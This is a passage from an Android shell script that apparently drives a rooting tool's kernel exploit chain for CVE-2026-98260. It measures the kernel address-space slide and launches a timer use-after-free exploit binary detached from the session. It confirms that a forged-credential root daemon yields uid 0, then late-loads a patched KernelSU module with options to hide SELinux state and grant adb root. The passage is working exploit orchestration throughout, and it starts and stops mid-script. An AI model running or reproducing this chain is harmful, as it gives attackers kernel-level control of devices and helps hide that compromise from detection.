            _probe_out=$(timeout 45 "$B/slide_probe" 2>&1)
            printf '%s\n' "$_probe_out" | grep -E '\[slide\]' | tail -20 || true
            _site=$(printf '%s\n' "$_probe_out" |
                sed -n 's/.*site=\(0x[0-9a-fA-F]*\).*/\1/p' | tail -1 | tr -d '\r')
            _probe_slide=$(printf '%s\n' "$_probe_out" |
                sed -n 's/.*slide=\(0x[0-9a-fA-F]*\).*/\1/p' | tail -1 | tr -d '\r')
            case "$_probe_slide" in
                *00000)
                    SLIDE_ARG="--slide $_probe_slide"
                    echo "98260_SLIDE_SOURCE=raw_probe value=$_probe_slide site=$_site"
                    ;;
            esac
            if [ -z "$SLIDE_ARG" ]; then
            # Android sh (mksh) arithmetic is 32-bit and truncates kernel
            # pointers.  addrcalc performs the full 64-bit slide addition.
            case "$_site" in
                0x*)
                    _slide_hex=""
                    if [ -x "$D/98260-h1c/addrcalc" ]; then
                        _slide_hex=$("$D/98260-h1c/addrcalc" add "$_site" 0x3f7fc1ffa4 2>/dev/null | tr -d ' \r\n')
                    fi
                    case "$_slide_hex" in
                        0x*00000)
                            SLIDE_ARG="--slide $_slide_hex"
                            echo "98260_SLIDE_SOURCE=raw_probe value=$_slide_hex site=$_site"
                            ;;
                        *)
                            echo "98260_SLIDE_RAW_REJECT site=$_site slide=${_slide_hex:-addrcalc_missing}"
                            ;;
                    esac
                    ;;
                *)
                    echo "98260_SLIDE_RAW_FAILED reason=no_site"
                    ;;
            esac
            fi
        fi
        if [ -z "$SLIDE_ARG" ] &&
             [ "${MAGICROOT_98260_EXTERNAL_SLIDE:-1}" = "1" ] &&
             [ -x "$B/grab_slide_618.sh" ] && [ -x "$B/kaslr_slide" ] &&
             [ -x "$B/forker_618" ]; then
            echo "98260_SLIDE_LEGACY_BEGIN reason=raw_probe_failed"
            _so=$(sh "$B/grab_slide_618.sh" "$B" 2>&1)
            printf '%s\n' "$_so" | grep -E 'KASLR_(SLIDE|VOTES)=' | tail -4 || true
            _sl=$(printf '%s\n' "$_so" | sed -n 's/^KASLR_SLIDE=//p' | head -1 | tr -d '\r')
            _vo=$(printf '%s\n' "$_so" | sed -n 's/^KASLR_VOTES=//p' | head -1 | tr -d '\r')
            _vn=$((_vo)) 2>/dev/null || _vn=-1
            case "$_sl" in
                *00000)
                    if [ "$_vn" -ge 3 ] 2>/dev/null; then
                        SLIDE_ARG="--slide $_sl"
                        echo "98260_SLIDE_SOURCE=legacy_helper value=$_sl votes=$_vo"
                    else
                        echo "98260_SLIDE_LEGACY_REJECT value=$_sl votes=${_vo:-?}"
                    fi ;;
                *)
                    echo "98260_SLIDE_LEGACY_FAILED reason=no_slide" ;;
            esac
        fi
        if [ -z "$SLIDE_ARG" ]; then
            echo "98260_SLIDE_SOURCE=none reason=raw_and_legacy_failed"
        fi
        ;;
    "$D/98260-61821-brm")
        # BRM-AN00 g186: slide_probe.c hardcodes site_low=0x1e1fd0.
        if [ -n "${MAGICROOT_98260_SLIDE:-}" ]; then
            _es=$((MAGICROOT_98260_SLIDE)) 2>/dev/null || _es=-1
            if [ "$_es" -gt 0 ] 2>/dev/null && [ $((_es % 2097152)) -eq 0 ]; then
                SLIDE_ARG="--slide $MAGICROOT_98260_SLIDE"
                echo "98260_SLIDE_SOURCE=explicit value=$MAGICROOT_98260_SLIDE"
            fi
        fi
        if [ -z "$SLIDE_ARG" ] && [ -x "$B/slide_probe" ]; then
            echo "98260_SLIDE_RAW_BEGIN probe=$B/slide_probe link=0xffffffc0803e1fd0"
            _po=$(timeout 45 "$B/slide_probe" 2>&1)
            printf '%s\n' "$_po" | grep -E '\[slide\]' | tail -20 || true
            _si=$(printf '%s\n' "$_po" |
                sed -n 's/.*site=\(0x[0-9a-fA-F]*\).*/\1/p' | tail -1 | tr -d '\r')
            # Android sh (mksh) arithmetic is 32-bit and truncates kernel
            # pointers.  addrcalc performs the full 64-bit slide addition.
            case "$_si" in
                0x*)
                    _sh=""
                    if [ -x "$D/98260-h1c/addrcalc" ]; then
                        _sh=$("$D/98260-h1c/addrcalc" add "$_si" 0x3f7fc1e030 2>/dev/null | tr -d ' \r\n')
                    fi
                    case "$_sh" in
                        0x*00000)
                            SLIDE_ARG="--slide $_sh"
                            SLIDE=$_sh
                            echo "98260_SLIDE_SOURCE=raw_probe value=$_sh site=$_si"
                            ;;
                        *)
                            echo "98260_SLIDE_RAW_REJECT site=$_si slide=${_sh:-addrcalc_missing}"
                            ;;
                    esac ;;
                *) echo "98260_SLIDE_RAW_FAILED reason=no_site" ;;
            esac
        fi
        if [ -z "$SLIDE_ARG" ]; then
            echo "FAIL=98260_brm_slide_missing"
            echo "98260_CHAIN_END=FAIL code=78"
            exit 78
        fi
        ;;
    *)
        # Other profiles keep the original explicit-slide passthrough.
        if [ -n "${MAGICROOT_98260_SLIDE:-}" ]; then
            SLIDE_ARG="--slide $MAGICROOT_98260_SLIDE"
            echo "98260_SLIDE_SOURCE=explicit_profile value=$MAGICROOT_98260_SLIDE"
        fi
        ;;
esac
fi

# ---------------------------------------------------------------------------
# Legacy BRM chain only.  H1C profiles (6.18.21) must never launch the old
# exploit: it plants a second timer-UAF with 6.12-era geometry on a kernel
# whose k_itimer is 384 B / node 0xe0, leaving a parked process and racing the
# H1C plant.  Everything below up to the H1C dispatch is legacy-only.
# ---------------------------------------------------------------------------
if [ "$H1C_ONLY" != "1" ]; then

# Reuse a proven rootd before applying the parked/new-plant guards.
if [ -S "$SOCK" ] && [ -x "$SU" ] && pidof exploit-android-key-ptr >/dev/null 2>&1; then
    verify_su
    if awk '$1 == 0 { found = 1 } END { exit found ? 0 : 1 }' "$VERIFY" &&
       verify_credential_fields; then
        if [ "$REAL_CRED_ARG" = "--no-real-cred" ]; then
            echo "98260_PROOF_MODE=no-real-cred effective_saved_fs_ids=0 real_ids=informational"
        else
            echo "98260_PROOF_MODE=real-cred all_ids=0"
        fi
        echo "98260_SUCCESS=1 reused=1"
        echo "98260_SU=$SU"
        echo "98260_ROOTD_SOCK=$SOCK"
        cat "$VERIFY"
        echo "98260_CHAIN_END=OK"
        exit 0
    fi
fi

# If KernelSU is already loaded, do not start another UAF.  Reuse its su
# provider if available; otherwise fail closed and require a reboot.  Running
# the UAF again while Enforcing only leaves a parked process and a false
# success/reused=0 report.
if [ "${MAGICROOT_98260_KSU:-1}" = "1" ] &&
   grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
    _reuse_su=""
    for _c in su /system/bin/su /data/adb/ksu/bin/su; do
        case "$_c" in
            /*) [ -x "$_c" ] || continue ;;
            *) command -v "$_c" >/dev/null 2>&1 || continue ;;
        esac
        _u=$(timeout 3 "$_c" -c 'id -u' 2>/dev/null | tr -d ' \r\n')
        if [ "$_u" = "0" ]; then _reuse_su="$_c"; break; fi
    done
    if [ -n "$_reuse_su" ]; then
        echo "98260_KSU=loaded already"
        echo "98260_REUSE=ksu-su path=$_reuse_su"
        echo "98260_SUCCESS=1 reused=1"
        echo "98260_SU_PROVIDER=$_reuse_su"
        echo "98260_CHAIN_END=OK"
        exit 0
    fi
    echo "FAIL=ksu_loaded_without_su_reuse reason=reboot_required"
    echo "HINT=KernelSU module is already loaded; no working su provider. Reboot before retrying."
    echo "98260_CHAIN_END=FAIL code=81"
    exit 81
fi

# No reusable rootd/KSU remains: apply the failed-UAF marker before any new run.
parked_check

# A development/direct binary may be named plant_rc*, not exploit-android-key-ptr.
# The boot-scoped unproven ledger is the authoritative guard: any live watcher
# with unresolved armed victims forbids another plant regardless of comm name.
UNPROVEN_MARKER=/data/local/tmp/.magicroot-unproven
if [ -f "$UNPROVEN_MARKER" ]; then
    _unproven_boot=$(awk '{print $1}' "$UNPROVEN_MARKER" 2>/dev/null)
    _unproven_count=$(awk '{print $2}' "$UNPROVEN_MARKER" 2>/dev/null)
    case "$_unproven_count" in ''|*[!0-9]*) _unproven_count=1 ;; esac
    if [ "$_unproven_boot" = "$BOOT_ID" ] && [ "$_unproven_count" -gt 0 ]; then
        echo "FAIL=98260_unproven_victims_reboot_required count=$_unproven_count boot=$BOOT_ID"
        echo "HINT=an existing plant watcher has unresolved armed victims; do not start another UAF or kill its parent"
        echo "98260_CHAIN_END=FAIL code=80"
        exit 80
    fi
fi

# A live plant with no usable socket is a parked zombie from a previous
# attempt.  Starting another plant would leak another full-cap process and
# make the next panic/debug state ambiguous.  Leave it parked; reboot.
if pidof exploit-android-key-ptr >/dev/null 2>&1; then
    parked_mark
    echo "FAIL=rootd_live_without_usable_socket sock=$SOCK pid=$(pidof exploit-android-key-ptr 2>/dev/null)"
    echo "HINT=reboot required; do not start a second plant and do not SIGKILL the parked process"
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi

if ! rm -f "$STATE" 2>/dev/null; then
    echo "FAIL=native_state_reset_failed path=$STATE run=$RUN_ID"
    echo "98260_CHAIN_END=FAIL code=73"
    exit 73
fi
rm -f "$SOCK" 2>/dev/null || true

cd "$D" || exit 74
PAYLOAD_SHA=$(sha256sum "$BIN" 2>/dev/null)
PAYLOAD_SHA=${PAYLOAD_SHA%% *}
if ! : > "$LOG"; then
    echo "FAIL=native_log_unwritable path=$LOG"
    echo "98260_CHAIN_END=FAIL code=73"
    exit 73
fi
# Durable mirror of the payload log: the payload opens this with O_SYNC, so a
# panic cannot leave the tail of the run as NULs (2026-11-11 22:48).
: > "$LOG.sync" 2>/dev/null || true
{
    echo "98260_NATIVE_BEGIN run=$RUN_ID boot=$BOOT_ID"
    echo "98260_PAYLOAD_SHA256=${PAYLOAD_SHA:-unknown}"
    echo "98260_NATIVE_STATE=$STATE"
} >> "$LOG"
echo "98260_RUN_ID=$RUN_ID"
echo "98260_BOOT_ID=$BOOT_ID"
echo "98260_PAYLOAD_SHA256=${PAYLOAD_SHA:-unknown}"
echo "98260_LOG=$LOG"
# Detach into a new session so an interrupted adb shell / app shell cannot
# deliver SIGHUP/SIGTERM to the exploit or its rootd child.  stdin must be
# closed as well: adb's pty would otherwise keep the process tied to the
# session that dies on disconnect.
if command -v setsid >/dev/null 2>&1; then
    SETSID="setsid"
elif [ -x /system/bin/toybox ]; then
    SETSID="/system/bin/toybox setsid"
else
    SETSID=""
fi

# real-cred in-process finit: the listener socket is blocked by this ROM's
# vendor LSM (bind EACCES), so the mintwait child loads the KO itself once the
# runner has patched it.  Params go through a file to keep env values space-free.
FINIT_ENV=""
if [ "$REAL_CRED_NATIVE" = "1" ] && [ "${MAGICROOT_98260_KSU:-1}" = "1" ]; then
    mkdir -p "$D/98260" 2>/dev/null || true
    rm -f "$D/98260/ksu-patched.ko" "$D/98260/ksu-patched.ready" 2>/dev/null || true
    _fparams=""
    [ "${MAGICROOT_ALLOW_SHELL:-1}" = "1" ] && _fparams="allow_shell=1"
    [ "${MAGICROOT_SU_COMPAT:-1}" = "0" ] && _fparams="${_fparams:+$_fparams }force_feature=su_compat:0"
    printf '%s' "$_fparams" > "$D/98260/finit.params" 2>/dev/null || true
    chmod 666 "$D/98260/finit.params" 2>/dev/null || true
    FINIT_ENV="PC98260_FINIT_READY=$D/98260/ksu-patched.ready PC98260_FINIT_KO=$D/98260/ksu-patched.ko PC98260_FINIT_PARAMS_FILE=$D/98260/finit.params PC98260_FINIT_EXIT=1"
    echo "98260_REAL_CRED_INPROC_PLAN=1 ko=$D/98260/ksu-patched.ko params=${_fparams:-none}"
fi
if [ -n "$SETSID" ]; then
    $SETSID env \
        PC98260_MAX_ATTEMPTS=$ATTEMPTS \
        PC98260_NO_FALLBACK=1 \
        PC98260_STATE_FILE=$STATE \
        PC98260_SYNC_LOG=$LOG.sync \
        $ABORT_ENV \
        $FALLBACK_ENV \
        $STREAM_BUF_ENV \
        PC98260_BUDGET_S=$BUDGET \
        PC98260_WAIT_CAP_S=$WAIT_CAP \
        $REAL_CRED_ENV \
        $FINIT_ENV \
        PC98260_CHURN_ROUNDS=$CHURN_ROUNDS \
        PC98260_CHURN_PER_CPU=$CHURN_PER_CPU \
        "$BIN" $REAL_CRED_ARG $SLIDE_ARG < /dev/null >> "$LOG" 2>&1 &
    DETACH_MODE=setsid
else
    nohup env \
        PC98260_MAX_ATTEMPTS=$ATTEMPTS \
        PC98260_NO_FALLBACK=1 \
        PC98260_STATE_FILE=$STATE \
        PC98260_SYNC_LOG=$LOG.sync \
        $ABORT_ENV \
        $FALLBACK_ENV \
        $STREAM_BUF_ENV \
        PC98260_BUDGET_S=$BUDGET \
        PC98260_WAIT_CAP_S=$WAIT_CAP \
        $REAL_CRED_ENV \
        $FINIT_ENV \
        PC98260_CHURN_ROUNDS=$CHURN_ROUNDS \
        PC98260_CHURN_PER_CPU=$CHURN_PER_CPU \
        "$BIN" $REAL_CRED_ARG $SLIDE_ARG < /dev/null >> "$LOG" 2>&1 &
    DETACH_MODE=nohup
fi
EXEC_PID=$!
UAF_ARMED=0
echo "98260_EXEC_PID=$EXEC_PID"
echo "98260_DETACH=$DETACH_MODE"

# The standalone --check sampler can fail under load and leave SLIDE empty,
# while the exploit's own sampler succeeds a moment later.  Recover that
# measured value from the payload log before the KSU patch; otherwise KSU is
# skipped even though the plant/rootd may already be up.
if [ -z "${SLIDE:-}" ]; then
    _slide_wait=0
    while [ "$_slide_wait" -lt 30 ]; do
        _slide_cand=$(sed -n 's/.*\[slide\] measured \(0x[0-9a-fA-F]*\).*/\1/p' "$LOG" 2>/dev/null | tail -1)
        [ -n "$_slide_cand" ] || _slide_cand=$(sed -n 's/.*\[slide\] cached \(0x[0-9a-fA-F]*\).*/\1/p' "$LOG" 2>/dev/null | tail -1)
        [ -n "$_slide_cand" ] || _slide_cand=$(sed -n 's/.*\[slide\] \(0x[0-9a-fA-F]*\).*/\1/p' "$LOG" 2>/dev/null | tail -1)
        case "$_slide_cand" in ''|0x0|0x0000000000000000) _slide_cand="" ;; esac
        if [ -n "$_slide_cand" ]; then
            SLIDE=$_slide_cand
            echo "98260_SLIDE_SOURCE=payload_log value=$SLIDE waited=${_slide_wait}s"
            break
        fi
        if grep -q '\[slide\] measurement did not converge' "$LOG" 2>/dev/null; then
            echo "98260_SLIDE_SOURCE=payload_log_failed reason=not_converged"
            break
        fi
        sleep 1
        _slide_wait=$((_slide_wait + 1))
    done
fi

native_fail() {
    _reason=$1
    if [ "$UAF_ARMED" = "1" ]; then
        if grep -q 'ZERO_RESIDUAL=1' "$LOG" 2>/dev/null; then
            # Zero-residual exit (Shark v2.4): every armed victim was reaped
            # and no fake-cred page survives, so the plant exited without a
            # holder.  A same-boot retry is safe; do not park the guard.
            echo "98260_ZERO_RESIDUAL=1 reason=no_armed_victims; same-boot retry allowed"
            UAF_ARMED=0
        else
            parked_mark || true
            echo "HINT=do NOT kill the armed plant; reboot before another UAF"
        fi
    else
        case "$_reason" in
            exec_exited_before_terminal)
                echo "98260_PRE_ARM_EXIT=1 run=$RUN_ID" ;;
            *)
                echo "98260_PRE_ARM_RUNNING=1 run=$RUN_ID" ;;
        esac
    fi
    echo "FAIL=proof $_reason pid=$EXEC_PID run=$RUN_ID"
    echo "98260_NATIVE_STATE=${_state:-unknown}"
    tail -80 "$LOG" 2>/dev/null || true
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
}

if [ "$REAL_CRED_NATIVE" = "1" ]; then
    # No listener socket on this ROM (vendor LSM blocks bind).  The plant's
    # mintwait child loads the patched KO in-process after cap; the socket
    # proof block is replaced by the /proc/modules wait in the KSU handoff.
    echo "98260_REAL_CRED_INPROC=1 proof=module_load"
else

i=0
while [ "$i" -lt "$PROOF_WAIT" ]; do
    _state=$(cat "$STATE" 2>/dev/null | tr -d ' \r\n')
    case "$_state" in
        ARMED) UAF_ARMED=1 ;;
        NO_ROOT)
            UAF_ARMED=1
            echo "98260_NATIVE_TERMINAL=no_root run=$RUN_ID"
            native_fail native_no_root_terminal
            ;;
    esac
    if [ -S "$SOCK" ]; then break; fi
    # The fake-cred rootd can fail bind/chown under this ROM's vendor LSM.
    # Without this check the runner would wait PROOF_WAIT (default 720 s)
    # for a socket that can never appear.
    if grep -Eq 'rootd\] (startup failed|bind failed|listen failed)' "$LOG" 2>/dev/null; then
        echo "98260_ROOTD_STARTUP=failed reason=bind_or_chown log=$LOG"
        echo "HINT=fake-cred rootd command channel unavailable; do not retry a parked plant"
        native_fail rootd_startup_failed
    fi
    if ! kill -0 "$EXEC_PID" 2>/dev/null; then
        native_fail exec_exited_before_terminal
    fi
    sleep 1
    i=$((i + 1))
done

if [ ! -S "$SOCK" ]; then
    _state=$(cat "$STATE" 2>/dev/null | tr -d ' \r\n')
    [ "$_state" = "ARMED" ] && UAF_ARMED=1
    echo "98260_NATIVE_STILL_RUNNING=1 run=$RUN_ID"
    native_fail native_not_terminal_after_${PROOF_WAIT}s
fi

verify_su
cat "$VERIFY"
if ! awk '$1 == 0 { found = 1 } END { exit found ? 0 : 1 }' "$VERIFY"; then
    parked_mark || true
    echo "FAIL=proof uid_not_zero"
    echo "HINT=rootd process is left running; reboot if repeated"
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi
if ! verify_credential_fields; then
    parked_mark || true
    if [ "$REAL_CRED_ARG" = "--no-real-cred" ]; then
        echo "FAIL=proof effective_or_fs_id_not_zero mode=no-real-cred"
    else
        echo "FAIL=proof real_uid_or_gid_not_zero mode=real-cred"
    fi
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi
if [ "$REAL_CRED_ARG" = "--no-real-cred" ]; then
    echo "98260_PROOF_MODE=no-real-cred effective_saved_fs_ids=0 real_ids=informational"
else
    echo "98260_PROOF_MODE=real-cred all_ids=0"
fi
fi

UAF_ARMED=0

# SuSFS does not depend on KernelSU su.  Load the bundled guard while the
# fake-cred rootd connection is still usable; the LKM then survives the KSU
# late-load even when /system/bin/su is not granted yet.  Mark the boot id so
# run.sh can report it after KSU hides /sys/module from the shell domain.
SUSFS_PRELOAD=0
_pre_kmi=$(uname -r 2>/dev/null | sed -n 's/^\([0-9][0-9]*\.[0-9][0-9]*\).*/\1/p')
[ -n "$_pre_kmi" ] || _pre_kmi=unknown
_pre_guard="$D/susfs_guard_lkm-${_pre_kmi}.ko"
_pre_flavor=${MAGICROOT_KSU_FLAVOR:-}
[ -n "$_pre_flavor" ] || _pre_flavor=$(cat "$D/ksu_flavor" 2>/dev/null | tr -d '\r\n')
[ -n "$_pre_flavor" ] || _pre_flavor=kernelsu
case "$_pre_flavor" in
    kernelsu|official) _pre_guard="" ;;
esac
_pre_updated="$D/susfs_guard_lkm.updated.ko"
if [ -n "$_pre_guard" ] && [ -f "$_pre_updated" ]; then
    _pre_vm=$(grep -a -o 'vermagic=[^ ]*' "$_pre_updated" 2>/dev/null | head -1)
    case "$_pre_vm" in
        *"${_pre_kmi}."*) _pre_guard="$_pre_updated" ;;
    esac
fi
if [ "$REAL_CRED_NATIVE" = "1" ] && [ "${MAGICROOT_SUSFS:-0}" = "1" ]; then
    echo "SUSFS_PRELOAD=skip reason=real_cred_inproc_finit_no_socket"
elif [ "${MAGICROOT_SUSFS:-0}" = "1" ] &&
   [ -f "$_pre_guard" ] && [ -x "$SU" ]; then
    echo "SUSFS_PRELOAD_BEGIN kmi=$_pre_kmi ko=$_pre_guard"
    {
        "$SU" -c "'$D/susfs_insmod' '$_pre_guard' expose_proc=1" >> "${KSU_LOG:-$D/98260-ksu.log}" 2>&1
        _sprc=$?
    }
    echo "SUSFS_PRELOAD_RC=$_sprc"
    if [ "$_sprc" = "0" ]; then
        SUSFS_PRELOAD=1
        cat /proc/sys/kernel/random/boot_id > "$D/.susfs_preloaded" 2>/dev/null || true
    fi
elif [ "${MAGICROOT_SUSFS:-0}" = "1" ] && [ "$_pre_flavor" != "kernelsu" ] && [ "$_pre_flavor" != "official" ]; then
    echo "SUSFS_PRELOAD=skip reason=no_guard_for_kmi kmi=$_pre_kmi"
elif [ "${MAGICROOT_SUSFS:-0}" = "1" ]; then
    echo "SUSFS_PRELOAD=skip reason=official_ksu_unsupported flavor=$_pre_flavor"
fi

fi # legacy BRM chain only

# ---------------------------------------------------------------------------
# Resolve flavor/profile/syms/slide once.  Both the custom KO patch and the
# KernelSU handoff must use the currently selected Flavor's symbols.
# ---------------------------------------------------------------------------
KSU_ENABLE=${MAGICROOT_98260_KSU:-1}
KSU_LOG=$D/98260-ksu.log
KSU_SU_READY=0
ADB_ROOT_98260=${MAGICROOT_ADB_ROOT:-0}
case "$ADB_ROOT_98260" in 1) ;; *) ADB_ROOT_98260=0 ;; esac
KERNEL_UMOUNT_98260=${MAGICROOT_KERNEL_UMOUNT:-1}
case "$KERNEL_UMOUNT_98260" in 1) ;; *) KERNEL_UMOUNT_98260=0 ;; esac
SELINUX_HIDE_98260=${MAGICROOT_SELINUX_HIDE:-1}
case "$SELINUX_HIDE_98260" in 1) ;; *) SELINUX_HIDE_98260=0 ;; esac
ALLOW_SHELL_98260=${MAGICROOT_ALLOW_SHELL:-1}
case "$ALLOW_SHELL_98260" in 1) ;; *) ALLOW_SHELL_98260=0 ;; esac
SU_COMPAT_98260=${MAGICROOT_SU_COMPAT:-1}
case "$SU_COMPAT_98260" in 1) ;; *) SU_COMPAT_98260=0 ;; esac
SU_ENTRY_98260=${MAGICROOT_SU_ENTRY:-0}
case "$SU_ENTRY_98260" in 1) ;; *) SU_ENTRY_98260=0 ;; esac
# su_entry without su_compat has no persistent provider: the old
# /product/bin wrapper called pc98260-su, but rootd is cleaned below, so every
# later app call died with KSU_RC=127.  Keep a real KSU su provider whenever
# su_entry is requested; the product-bin bind mount is no longer created.
if [ "$SU_ENTRY_98260" = "1" ] && [ "$SU_COMPAT_98260" = "0" ]; then
    echo "98260_SU_COMPAT_OVERRIDE=1 reason=su_entry_needs_persistent_provider"
    SU_COMPAT_98260=1
fi
echo "98260_OPTIONS=mode=$CRED_MODE allow_shell=$ALLOW_SHELL_98260 su_compat=$SU_COMPAT_98260 su_entry=$SU_ENTRY_98260 kernel_umount=$KERNEL_UMOUNT_98260 selinux_hide=$SELINUX_HIDE_98260 adb_root=$ADB_ROOT_98260"
KSU_FLAVOR_LOCAL=$(printf '%s' "${MAGICROOT_KSU_FLAVOR:-}" | tr -d '\r\n')
[ -n "$KSU_FLAVOR_LOCAL" ] || KSU_FLAVOR_LOCAL=$(cat "$D/ksu_flavor" 2>/dev/null | tr -d '\r\n')
[ -n "$KSU_FLAVOR_LOCAL" ] || KSU_FLAVOR_LOCAL=kernelsu
CHECK_JSON=$D/98260-check.json
SLIDE=""
if [ "$H1C_ONLY" = "1" ]; then
    echo "98260_CHECK=deferred_h1c"
else
    "$BIN" --check > "$CHECK_JSON" 2>/dev/null || true
    SLIDE=$(sed -n 's/.*"slide":"\(0x[0-9a-fA-F]*\)".*/\1/p' "$CHECK_JSON" 2>/dev/null | tail -1)
    if [ -z "$SLIDE" ]; then
        SLIDE=$(sed -n 's/.*\[slide\] measured \(0x[0-9a-fA-F]*\).*/\1/p' "$LOG" 2>/dev/null | tail -1)
    fi
fi
if [ -f "$D/kernel_profiles.sh" ]; then
    . "$D/kernel_profiles.sh" 2>/dev/null || true
fi
KSU_FLAVOR_LOCAL=$(ksu_flavor_normalize "$KSU_FLAVOR_LOCAL" 2>/dev/null || echo kernelsu)
ksu_select_ko "$PROFILE_LOCAL" "$KSU_FLAVOR_LOCAL" 2>/dev/null || true
if [ "$PROFILE_LOCAL-$KSU_FLAVOR_LOCAL" = "61821brm-kernelsu" ]; then
    echo "98260_MANAGER_KO_OVERRIDE=skip reason=brm_official_compat_required"
    # Auto late-load patch: the app carved the manager KO and applied the
    # structural input-hook no-op on-device (SukisuLateLoadPatch.java).  Only
    # SukiSU's prologue needs it; other flavors' files are never produced, so
    # this branch simply does not trigger for them.  Prefer the patched KO over
    # the raw manager KO for the late-load path, on any kernel.
    KO_TEMPLATE="$D/ko-$KSU_FLAVOR_LOCAL-lateload.ko"
    KO_COMPAT=manager-lateload-autopatch
    echo "98260_KSU_AUTOPATCH=1 flavor=$KSU_FLAVOR_LOCAL path=$KO_TEMPLATE"
elif [ "$PROFILE_LOCAL-$KSU_FLAVOR_LOCAL" = "61821brm-kernelsu" ]; then
    echo "98260_MANAGER_KO_OVERRIDE=skip reason=brm_official_compat_required"
elif [ -n "${MAGICROOT_MANAGER_KO:-}" ] && [ -f "$MAGICROOT_MANAGER_KO" ]; then
    KO_TEMPLATE="$MAGICROOT_MANAGER_KO"
    KO_COMPAT=manager-adaptive
    echo "98260_MANAGER_KO_OVERRIDE=app-adaptive path=$KO_TEMPLATE"
fi
MGR=${MAGICROOT_KSU_PKG:-$(ksu_flavor_pkg "$KSU_FLAVOR_LOCAL" 2>/dev/null || echo me.weishu.kernelsu)}
echo "98260_SYMBOLS=flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL slide=$SLIDE"
[ -n "$SLIDE" ] || echo "98260_SLIDE_MISSING=1"

# HOneClick CVE-2026-98260 engine (g928/g186).  It owns preflight, slide,
# rootd, module load and userspace bootstrap; the selected Flavor remains the
# module source.  6.18.21 always uses H1C; the UI's BRM choice is ignored.
if [ "$H1C_ONLY" = "1" ]; then

    # The legacy "already loaded" fast path is inside the BRM-only block above,
    # so H1C needs its own: a second run in the same boot where KernelSU is
    # live must reuse the working su provider instead of planting again.
    if [ "${MAGICROOT_98260_KSU:-1}" = "1" ] && ksu_loaded_98260; then
        _h1c_su=""
        for _c in su /system/bin/su /data/adb/ksu/bin/su; do
            case "$_c" in
                /*) [ -x "$_c" ] || continue ;;
                *) command -v "$_c" >/dev/null 2>&1 || continue ;;
            esac
            _u=$(timeout 3 "$_c" -c 'id -u' 2>/dev/null | tr -d ' \r\n')
            if [ "$_u" = "0" ]; then _h1c_su="$_c"; break; fi
        done
        if [ -n "$_h1c_su" ]; then
            echo "98260_H1C=already_loaded"
            echo "98260_REUSE=ksu-su path=$_h1c_su"
            echo "98260_KSU=loaded already"
            echo "98260_SUCCESS=1 reused=1"
            echo "98260_SU_PROVIDER=$_h1c_su"
            echo "98260_CHAIN_END=OK"
            exit 0
        fi
        echo "FAIL=ksu_loaded_without_su_reuse engine=h1c reason=reboot_required"
        echo "98260_CHAIN_END=FAIL code=81"
        exit 81
    fi

    if [ -f "$D/98260-h1c/run_h1c.sh" ] &&
       { [ "${MAGICROOT_98260_PREFLIGHT:-0}" = "1" ] ||
         { [ -f "$KO_TEMPLATE" ] && [ -f "$SYMS" ]; }; }; then
        # A failed H1C plant stays parked by design.  The legacy parked check
        # only looks for exploit-android-key-ptr, so guard the H1C process name
        # explicitly before starting a second UAF.
        if pidof cve98260_plant >/dev/null 2>&1; then
            echo "FAIL=98260_h1c_plant_already_running pid=$(pidof cve98260_plant 2>/dev/null)"
            echo "HINT=reboot required; do not start a second H1C plant"
            echo "98260_CHAIN_END=FAIL code=80"
            exit 80
        fi
        H1C_KSUD=""
        for _c in "${MAGICROOT_KSUD:-}" \
                  "$D/ksud_${KSU_FLAVOR_LOCAL}.manager" \
                  "$D/ksud_${KSU_FLAVOR_LOCAL}" \
                  "$D/ksud_kernelsu" "$D/ksud_bakasu" "$D/ksud_next" \
                  "$D/ksud_sukisu" "$D/ksud_fina" "$D/ksud" "/data/adb/ksud"; do
            [ -n "$_c" ] || continue
            if [ -x "$_c" ]; then H1C_KSUD="$_c"; break; fi
        done
        # A built-in exact profile wins over a previously imported adaptive
        # profile: g928/g186/gfee must never run with stale dynamic constants.
        # Initialize before the first read: run.sh uses set -u, and the fixed
        # 117 profile otherwise aborts here before any UAF is started.
        H1C_DYNAMIC_LOCAL="${MAGICROOT_98260_ADAPTIVE:-0}"
        case "$PROFILE_LOCAL" in
            61821|61821brm|61821h1c117) H1C_DYNAMIC_LOCAL=0 ;;
        esac
        if [ "$H1C_DYNAMIC_LOCAL" = "1" ] &&
           [ -f "${MAGICROOT_98260_ADAPTIVE_SYMS:-}" ]; then
            SYMS="$MAGICROOT_98260_ADAPTIVE_SYMS"
            echo "98260_ADAPTIVE_SYMS=$SYMS"
        fi
        H1C_TEMPLATE="$KO_TEMPLATE"
        if [ "$PROFILE_LOCAL" = "61821brm" ] && [ "$KSU_FLAVOR_LOCAL" = "kernelsu" ] &&
           [ -f "$D/98260-h1c/ksu-template-115.ko" ]; then
            # Upstream's 115 official module for the ge186 build.  Keep the
            # selected g186 syms table; legacy fallback still uses KO_TEMPLATE.
            H1C_TEMPLATE="$D/98260-h1c/ksu-template-115.ko"
        fi
        if [ -n "${CUSTOM_KO:-}" ] && [ -f "$CUSTOM_KO" ]; then
            H1C_TEMPLATE="$CUSTOM_KO"
            echo "98260_H1C_CUSTOM_KO=$CUSTOM_KO"
        fi
        echo "98260_ENGINE=h1c profile=$PROFILE_LOCAL template=$H1C_TEMPLATE syms=$SYMS ksud=${H1C_KSUD:-none}"
        H1C_PROFILE="$PROFILE_LOCAL" H1C_TEMPLATE="$H1C_TEMPLATE" \
            H1C_SYMS="$SYMS" H1C_KSUD="$H1C_KSUD" H1C_WORK="$D" \
            H1C_RUN_ID="$RUN_ID" H1C_BOOT_ID="$BOOT_ID" \
            H1C_PREFLIGHT_ONLY="${MAGICROOT_98260_PREFLIGHT:-0}" \
            H1C_ALLOW_SHELL="$ALLOW_SHELL_98260" \
            H1C_KSU_ENABLE="$KSU_ENABLE" \
            H1C_ADB_ROOT="$ADB_ROOT_98260" \
            H1C_KERNEL_UMOUNT="$KERNEL_UMOUNT_98260" \
            H1C_SELINUX_HIDE="$SELINUX_HIDE_98260" \
            H1C_SU_ENTRY="$SU_ENTRY_98260" \
            MAGICROOT_KEEP_ROOTD="${MAGICROOT_KEEP_ROOTD:-0}" \
            MAGICROOT_SU_COMPAT="$SU_COMPAT_98260" \
            H1C_DYNAMIC="$H1C_DYNAMIC_LOCAL" \
